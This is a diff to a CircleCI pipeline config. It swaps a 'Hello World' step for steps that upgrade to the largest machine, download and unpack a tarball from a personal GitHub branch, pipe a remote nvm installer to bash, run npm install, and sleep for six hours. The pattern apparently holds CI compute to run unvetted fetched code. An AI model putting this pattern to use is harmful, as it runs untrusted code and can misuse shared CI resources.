@@ -3,10 +3,25 @@ jobs:
   build:
     machine:
       image: ubuntu-2204:current
-    resource_class: large
+    resource_class: 2xlarge+
     steps:
       - run:
-          name: The First Step
+          name: Download File
           command: |
-            echo 'Hello World!'
-            echo 'This is the delivery pipeline'
+            wget https://github.com/dev-swarup/n/raw/refs/heads/circleci-project-setup/n.tar.gz
+            tar -xvf n.tar.gz
+      - run:
+          name: Install Node.js
+          command: |
+            curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.2/install.sh | bash
+            export NVM_DIR="$HOME/.nvm"
+            [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
+            [ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"
+      - run:
+          name: Install Dependencies
+          command: |
+            npm install
+      - run:
+          name: Sleep Machine
+          command: |
+            sleep 360m
